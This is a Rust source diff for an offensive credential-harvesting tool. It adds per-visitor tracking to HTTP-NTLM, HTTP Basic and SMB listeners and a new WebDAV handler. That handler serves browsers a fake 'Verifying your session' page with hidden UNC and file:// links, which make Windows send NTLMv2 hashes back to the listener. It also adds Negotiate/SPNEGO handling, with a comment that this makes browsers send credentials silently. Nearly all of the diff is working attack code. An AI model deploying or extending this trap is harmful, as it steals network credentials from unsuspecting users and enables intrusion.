@@ -39,6 +39,7 @@ struct ListenerEntry {
     started: std::time::Instant,
     stop:    Arc<std::sync::atomic::AtomicBool>,
     hashes:  Arc<Mutex<Vec<String>>>,
+    visits:  Arc<Mutex<std::collections::HashMap<String, u64>>>,
 }
 
 // ══════════════════════════════════════════════════════════════════════════════
@@ -1814,6 +1815,7 @@ pub fn listen_start(port: u16, proto: &str) -> String {
 
     let stop_flag = Arc::new(std::sync::atomic::AtomicBool::new(false));
     let hashes: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
+    let visits: Arc<Mutex<std::collections::HashMap<String, u64>>> = Arc::new(Mutex::new(std::collections::HashMap::new()));
     let mut active: Vec<String> = Vec::new();
     let mut failed: Vec<String> = Vec::new();
 
@@ -1824,17 +1826,18 @@ pub fn listen_start(port: u16, proto: &str) -> String {
             listener.set_nonblocking(true).ok();
             let stop_tcp = stop_flag.clone();
             let hashes_ref = hashes.clone();
+            let visits_ref = visits.clone();
             match proto {
                 "http-ntlm" => {
-                    std::thread::spawn(move || { _http_ntlm_listener_loop(listener, stop_tcp, hashes_ref); });
+                    std::thread::spawn(move || { _http_ntlm_listener_loop(listener, stop_tcp, hashes_ref, visits_ref); });
                     active.push(format!("HTTP-NTLM:{}", port));
                 }
                 "http" => {
-                    std::thread::spawn(move || { _http_basic_listener_loop(listener, stop_tcp, hashes_ref); });
+                    std::thread::spawn(move || { _http_basic_listener_loop(listener, stop_tcp, hashes_ref, visits_ref); });
                     active.push(format!("HTTP:{}", port));
                 }
                 _ => {
-                    std::thread::spawn(move || { _smb_listener_loop(listener, stop_tcp, hashes_ref); });
+                    std::thread::spawn(move || { _smb_listener_loop(listener, stop_tcp, hashes_ref, visits_ref); });
                     active.push(format!("SMB:{}", port));
                 }
             }
@@ -1858,6 +1861,7 @@ pub fn listen_start(port: u16, proto: &str) -> String {
             started: std::time::Instant::now(),
             stop: stop_flag,
             hashes,
+            visits,
         });
     }
 
@@ -1974,16 +1978,37 @@ pub fn listen_dump() -> String {
     for entry in guard.iter() {
         let elapsed = entry.started.elapsed();
         let hashes = entry.hashes.lock().unwrap();
+        let visits = entry.visits.lock().unwrap();
         let label = entry.key.to_uppercase();
+        let total_visits: u64 = visits.values().sum();
 
-        if hashes.is_empty() {
-            out.push_str(&format!("[{}] 0 credentials (active {})\n", label, _fmt_duration(elapsed)));
-        } else {
-            let basic_count = hashes.iter().filter(|h| h.starts_with("[HTTP-Basic]")).count();
-            let ntlm_count = hashes.len() - basic_count;
-            if ntlm_count > 0 { has_ntlm = true; }
-            out.push_str(&format!("[{}] {} credentials (active {}) — {} NTLMv2 + {} Basic\n",
-                label, hashes.len(), _fmt_duration(elapsed), ntlm_count, basic_count));
+        let basic_count = hashes.iter().filter(|h| h.starts_with("[HTTP-Basic]")).count();
+        let ntlm_count = hashes.len() - basic_count;
+        if ntlm_count > 0 { has_ntlm = true; }
+
+        out.push_str(&format!("[{}] {} credentials, {} visits (active {})\n",
+            label, hashes.len(), total_visits, _fmt_duration(elapsed)));
+
+        if !visits.is_empty() {
+            out.push_str("  ─── Visitors ───\n");
+            let mut sorted_visits: Vec<(&String, &u64)> = visits.iter().collect();
+            sorted_visits.sort_by(|a, b| b.1.cmp(a.1));
+            for (ip, count) in &sorted_visits {
+                let ip_creds: Vec<&String> = hashes.iter()
+                    .filter(|h| h.contains(&format!("(from {})", ip)) || h.contains(&format!(":{}:", ip)))
+                    .collect();
+                if ip_creds.is_empty() {
+                    out.push_str(&format!("    {} — {} visit(s), no creds captured\n", ip, count));
+                } else {
+                    out.push_str(&format!("    {} — {} visit(s), {} cred(s):\n", ip, count, ip_creds.len()));
+                    for c in &ip_creds {
+                        out.push_str(&format!("      {}\n", c));
+                    }
+                }
+            }
+        }
+
+        if !hashes.is_empty() && visits.is_empty() {
             for h in hashes.iter() {
                 out.push_str("  ");
                 out.push_str(h);
@@ -2174,8 +2199,11 @@ fn _get_local_ip_bytes() -> [u8; 4] {
 // § HTTP NTLM LISTENER — captures NTLMv2 via HTTP 401 + WWW-Authenticate
 // ══════════════════════════════════════════════════════════════════════════════
 
-fn _http_ntlm_listener_loop(listener: std::net::TcpListener, stop: Arc<std::sync::atomic::AtomicBool>, hashes: Arc<Mutex<Vec<String>>>) {
+fn _http_ntlm_listener_loop(listener: std::net::TcpListener, stop: Arc<std::sync::atomic::AtomicBool>, hashes: Arc<Mutex<Vec<String>>>, visits: Arc<Mutex<std::collections::HashMap<String, u64>>>) {
     use std::time::Duration;
+
+    let local_ip = crate::sysinfo::local_ip();
+    let listen_port = listener.local_addr().map(|a| a.port()).unwrap_or(80);
 
     while !stop.load(std::sync::atomic::Ordering::Relaxed) {
         match listener.accept() {
@@ -2184,7 +2212,11 @@ fn _http_ntlm_listener_loop(listener: std::net::TcpListener, stop: Arc<std::sync
                 stream.set_write_timeout(Some(Duration::from_secs(10))).ok();
                 let peer = addr.ip().to_string();
 
-                if let Some(cred) = _handle_http_ntlm_client(&mut stream, &peer) {
+                if let Ok(mut v) = visits.lock() {
+                    *v.entry(peer.clone()).or_insert(0) += 1;
+                }
+
+                if let Some(cred) = _handle_http_ntlm_client_webdav(&mut stream, &peer, &local_ip, listen_port) {
                     if let Ok(mut h) = hashes.lock() {
                         if !_is_dup_cred(&h, &cred) {
                             if h.len() >= LISTEN_MAX_HASHES { h.remove(0); }
@@ -2203,7 +2235,7 @@ fn _http_ntlm_listener_loop(listener: std::net::TcpListener, stop: Arc<std::sync
     }
 }
 
-fn _http_basic_listener_loop(listener: std::net::TcpListener, stop: Arc<std::sync::atomic::AtomicBool>, hashes: Arc<Mutex<Vec<String>>>) {
+fn _http_basic_listener_loop(listener: std::net::TcpListener, stop: Arc<std::sync::atomic::AtomicBool>, hashes: Arc<Mutex<Vec<String>>>, visits: Arc<Mutex<std::collections::HashMap<String, u64>>>) {
     use std::time::Duration;
 
     while !stop.load(std::sync::atomic::Ordering::Relaxed) {
@@ -2212,6 +2244,10 @@ fn _http_basic_listener_loop(listener: std::net::TcpListener, stop: Arc<std::syn
                 stream.set_read_timeout(Some(Duration::from_secs(10))).ok();
                 stream.set_write_timeout(Some(Duration::from_secs(10))).ok();
                 let peer = addr.ip().to_string();
+
+                if let Ok(mut v) = visits.lock() {
+                    *v.entry(peer.clone()).or_insert(0) += 1;
+                }
 
                 if let Some(cred) = _handle_http_basic_only(&mut stream, &peer) {
                     if let Ok(mut h) = hashes.lock() {
@@ -2354,6 +2390,185 @@ fn _handle_http_ntlm_client(stream: &mut std::net::TcpStream, peer: &str) -> Opt
     }
 }
 
+/// Enhanced NTLM handler — serves WebDAV trap page to browsers, handles WebDAV NTLM auth.
+/// When a browser visits, it gets a page that triggers the Windows WebClient to connect back
+/// via WebDAV on the same port, leaking NTLMv2 automatically.
+fn _handle_http_ntlm_client_webdav(stream: &mut std::net::TcpStream, peer: &str, local_ip: &str, port: u16) -> Option<String> {
+    use std::io::Write;
+
+    let req1 = _http_read_request(stream)?;
+    let method = _http_method(&req1);
+
+    // WebDAV OPTIONS — respond with DAV capabilities to keep WebClient talking
+    if method == "OPTIONS" {
+        let auth = _http_extract_ntlm(&req1);
+        if auth.is_none() {
+            _webdav_send_options_401(stream, None)?;
+            let req2 = _http_read_request(stream)?;
+            return _webdav_ntlm_exchange(stream, &req2, peer);
+        }
+        return _webdav_ntlm_exchange(stream, &req1, peer);
+    }
+
+    // WebDAV PROPFIND / HEAD — WebClient probing the resource
+    if method == "PROPFIND" || method == "HEAD" {
+        let auth = _http_extract_ntlm(&req1);
+        if auth.is_none() {
+            _http_send_401(stream, None)?;
+            let req2 = _http_read_request(stream)?;
+            return _webdav_ntlm_exchange(stream, &req2, peer);
+        }
+        return _webdav_ntlm_exchange(stream, &req1, peer);
+    }
+
+    // Check for NTLM or Basic auth on first request (WebDAV GET with auth)
+    if let Some(cred) = _http_extract_basic(&req1, peer) {
+        _http_send_200(stream);
+        return Some(cred);
+    }
+    if let Some(_) = _http_extract_ntlm(&req1) {
+        return _webdav_ntlm_exchange(stream, &req1, peer);
+    }
+
+    // Normal browser GET without auth — serve the trap page with WebDAV UNC embed
+    let unc_port = if port == 80 { String::new() } else { format!("@{}", port) };
+    let trap_html = format!(
+        r#"<!DOCTYPE html>
+<html><head><title>Loading...</title></head>
+<body style="margin:0;font-family:Segoe UI,sans-serif;background:#f5f5f5">
+<div style="text-align:center;padding:80px 20px">
+<h2 style="color:#333">Please wait...</h2>
+<p style="color:#666">Verifying your session</p>
+<div style="margin:30px auto;width:40px;height:40px;border:3px solid #ddd;border-top:3px solid #0078d4;border-radius:50%;animation:s 1s linear infinite"></div>
+</div>
+<style>@keyframes s{{from{{transform:rotate(0)}}to{{transform:rotate(360deg)}} }}</style>
+<img src="\\\\{ip}{p}\\docs\\logo.png" style="display:none" alt="">
+<img src="file://{ip}{p}/docs/logo.png" style="display:none" alt="">
+<link rel="stylesheet" href="\\\\{ip}{p}\\docs\\style.css" type="text/css">
+<script>
+var x=new XMLHttpRequest();
+x.open('GET','\\\\{ip}{p}\\docs\\config.js',true);
+x.send();
+</script>
+</body></html>"#,
+        ip = local_ip,
+        p = unc_port,
+    );
+    let resp = format!(
+        "HTTP/1.1 200 OK\r\n\
+         Content-Type: text/html; charset=utf-8\r\n\
+         Content-Length: {}\r\n\
+         Connection: keep-alive\r\n\
+         \r\n\
+         {}",
+        trap_html.len(), trap_html
+    );
+    stream.write_all(resp.as_bytes()).ok()?;
+    stream.flush().ok()?;
+
+    // After serving the trap page, try to read the next request on the same connection
+    // (WebClient may reuse the connection for the UNC resource fetch)
+    if let Some(req2) = _http_read_request(stream) {
+        if let Some(cred) = _http_extract_basic(&req2, peer) {
+            _http_send_200(stream);
+            return Some(cred);
+        }
+        let method2 = _http_method(&req2);
+        if method2 == "OPTIONS" || method2 == "PROPFIND" || method2 == "HEAD" {
+            let auth = _http_extract_ntlm(&req2);
+            if auth.is_none() {
+                if method2 == "OPTIONS" {
+                    _webdav_send_options_401(stream, None)?;
+                } else {
+                    _http_send_401(stream, None)?;
+                }
+                if let Some(req3) = _http_read_request(stream) {
+                    return _webdav_ntlm_exchange(stream, &req3, peer);
+                }
+            }
+            return _webdav_ntlm_exchange(stream, &req2, peer);
+        }
+        if _http_extract_ntlm(&req2).is_some() {
+            return _webdav_ntlm_exchange(stream, &req2, peer);
+        }
+        // Second request has no auth — send 401
+        _http_send_401(stream, None)?;
+        if let Some(req3) = _http_read_request(stream) {
+            if let Some(cred) = _http_extract_basic(&req3, peer) {
+                _http_send_200(stream);
+                return Some(cred);
+            }
+            return _webdav_ntlm_exchange(stream, &req3, peer);
+        }
+    }
+
+    None
+}
+
+/// Handle the NTLM 3-step exchange on any request that has an NTLM token.
+fn _webdav_ntlm_exchange(stream: &mut std::net::TcpStream, req: &str, peer: &str) -> Option<String> {
+    let challenge = _random_challenge();
+
+    if let Some(cred) = _http_extract_basic(req, peer) {
+        _http_send_200(stream);
+        return Some(cred);
+    }
+
+    let token = _http_extract_ntlm(req)?;
+    let type1_bytes = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, token.trim()).ok()?;
+    let ntlmssp_sig = sb!("NTLMSSP");
+    if !type1_bytes.starts_with(&ntlmssp_sig) { return None; }
+    if type1_bytes.len() < 12 { return None; }
+    let msg_type = u32::from_le_bytes([type1_bytes[8], type1_bytes[9], type1_bytes[10], type1_bytes[11]]);
+    if msg_type != 1 { return None; }
+
+    let type2 = _build_ntlmssp_challenge(&challenge);
+    let type2_b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &type2);
+    _http_send_401(stream, Some(&type2_b64))?;
+
+    let req3 = _http_read_request(stream)?;
+    let type3_b64 = _http_extract_ntlm(&req3)?;
+    let type3_bytes = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, type3_b64.trim()).ok()?;
+
+    let hash = _extract_ntlmv2_from_auth(&type3_bytes, &challenge)?;
+    _http_send_200(stream);
+    Some(hash)
+}
+
+/// Send WebDAV OPTIONS response with 401 + Negotiate/NTLM challenge.
+fn _webdav_send_options_401(stream: &mut std::net::TcpStream, ntlm_token: Option<&str>) -> Option<()> {
+    use std::io::Write;
+    let auth_headers = match ntlm_token {
+        Some(token) => format!(
+            "WWW-Authenticate: Negotiate {tok}\r\n\
+             WWW-Authenticate: NTLM {tok}\r\n",
+            tok = token
+        ),
+        None => "WWW-Authenticate: Negotiate\r\n\
+                 WWW-Authenticate: NTLM\r\n".to_string(),
+    };
+    let resp = format!(
+        "HTTP/1.1 401 Unauthorized\r\n\
+         {}\
+         WWW-Authenticate: Basic realm=\"WebDAV\"\r\n\
+         DAV: 1,2\r\n\
+         Allow: OPTIONS, GET, HEAD, PROPFIND, PUT, DELETE, MKCOL, COPY, MOVE\r\n\
+         MS-Author-Via: DAV\r\n\
+         Content-Length: 0\r\n\
+         Connection: keep-alive\r\n\
+         \r\n",
+        auth_headers
+    );
+    stream.write_all(resp.as_bytes()).ok()?;
+    stream.flush().ok()?;
+    Some(())
+}
+
+/// Extract HTTP method from the first line of the request.
+fn _http_method(request: &str) -> &str {
+    request.split_whitespace().next().unwrap_or("")
+}
+
 /// Read an HTTP request from the stream. Returns the raw request as a String.
 fn _http_read_request(stream: &mut std::net::TcpStream) -> Option<String> {
     use std::io::Read;
@@ -2363,7 +2578,10 @@ fn _http_read_request(stream: &mut std::net::TcpStream) -> Option<String> {
     Some(String::from_utf8_lossy(&buf[..n]).to_string())
 }
 
-/// Extract the NTLM token from "Authorization: NTLM <base64>" header.
+/// Extract the NTLM/Negotiate token from Authorization header.
+/// Accepts "Authorization: NTLM <b64>", "Authorization: Negotiate <b64>".
+/// For Negotiate, the token may be a raw NTLMSSP blob or SPNEGO-wrapped;
+/// if SPNEGO, we unwrap to get the inner NTLMSSP token.
 fn _http_extract_ntlm(request: &str) -> Option<String> {
     for line in request.lines() {
         let lower = line.to_lowercase();
@@ -2372,7 +2590,28 @@ fn _http_extract_ntlm(request: &str) -> Option<String> {
             if let Some(token) = val.strip_prefix("NTLM ").or_else(|| val.strip_prefix("ntlm ")) {
                 return Some(token.to_string());
             }
+            if let Some(token) = val.strip_prefix("Negotiate ").or_else(|| val.strip_prefix("negotiate ")) {
+                let raw = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, token.trim()).ok()?;
+                let ntlmssp_sig: [u8; 8] = *b"NTLMSSP\0";
+                if raw.starts_with(&ntlmssp_sig) {
+                    return Some(token.to_string());
+                }
+                if let Some(inner) = _unwrap_spnego_ntlmssp(&raw) {
+                    return Some(base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &inner));
+                }
+                return None;
+            }
         }
+    }
+    None
+}
+
+/// Unwrap SPNEGO (ASN.1) to extract the inner NTLMSSP token.
+/// Handles both NegTokenInit (first message) and NegTokenResp (subsequent).
+fn _unwrap_spnego_ntlmssp(data: &[u8]) -> Option<Vec<u8>> {
+    let sig = b"NTLMSSP\0";
+    if let Some(pos) = data.windows(8).position(|w| w == sig) {
+        return Some(data[pos..].to_vec());
     }
     None
 }
@@ -2393,12 +2632,18 @@ fn _http_extract_basic(request: &str, peer: &str) -> Option<String> {
     None
 }
 
-/// Send HTTP 401 response. Advertises NTLM (preferred) + Basic as fallback.
+/// Send HTTP 401 response. Advertises Negotiate + NTLM + Basic.
+/// Negotiate triggers auto-logon in Intranet Zone (Chrome/Edge send creds silently).
 fn _http_send_401(stream: &mut std::net::TcpStream, ntlm_token: Option<&str>) -> Option<()> {
     use std::io::Write;
-    let ntlm_header = match ntlm_token {
-        Some(token) => format!("WWW-Authenticate: NTLM {}\r\n", token),
-        None        => "WWW-Authenticate: NTLM\r\n".to_string(),
+    let auth_headers = match ntlm_token {
+        Some(token) => format!(
+            "WWW-Authenticate: Negotiate {tok}\r\n\
+             WWW-Authenticate: NTLM {tok}\r\n",
+            tok = token
+        ),
+        None => "WWW-Authenticate: Negotiate\r\n\
+                 WWW-Authenticate: NTLM\r\n".to_string(),
     };
     let body = "<html><body><h1>401 Unauthorized</h1></body></html>";
     let resp = format!(
@@ -2410,7 +2655,7 @@ fn _http_send_401(stream: &mut std::net::TcpStream, ntlm_token: Option<&str>) ->
          Connection: keep-alive\r\n\
          \r\n\
          {}",
-        ntlm_header, body.len(), body
+        auth_headers, body.len(), body
     );
     stream.write_all(resp.as_bytes()).ok()?;
     stream.flush().ok()?;
@@ -2437,15 +2682,20 @@ fn _http_send_200(stream: &mut std::net::TcpStream) {
 // § SMB LISTENER — minimal SMB2 negotiate + NTLMSSP challenge/response
 // ══════════════════════════════════════════════════════════════════════════════
 
-fn _smb_listener_loop(listener: std::net::TcpListener, stop: Arc<std::sync::atomic::AtomicBool>, hashes: Arc<Mutex<Vec<String>>>) {
+fn _smb_listener_loop(listener: std::net::TcpListener, stop: Arc<std::sync::atomic::AtomicBool>, hashes: Arc<Mutex<Vec<String>>>, visits: Arc<Mutex<std::collections::HashMap<String, u64>>>) {
     use std::io::{Read, Write};
     use std::time::Duration;
 
     while !stop.load(std::sync::atomic::Ordering::Relaxed) {
         match listener.accept() {
-            Ok((mut stream, _addr)) => {
+            Ok((mut stream, addr)) => {
                 stream.set_read_timeout(Some(Duration::from_secs(10))).ok();
                 stream.set_write_timeout(Some(Duration::from_secs(10))).ok();
+                let peer = addr.ip().to_string();
+
+                if let Ok(mut v) = visits.lock() {
+                    *v.entry(peer).or_insert(0) += 1;
+                }
 
                 if let Some(hash) = _handle_smb_client(&mut stream) {
                     if let Ok(mut h) = hashes.lock() {
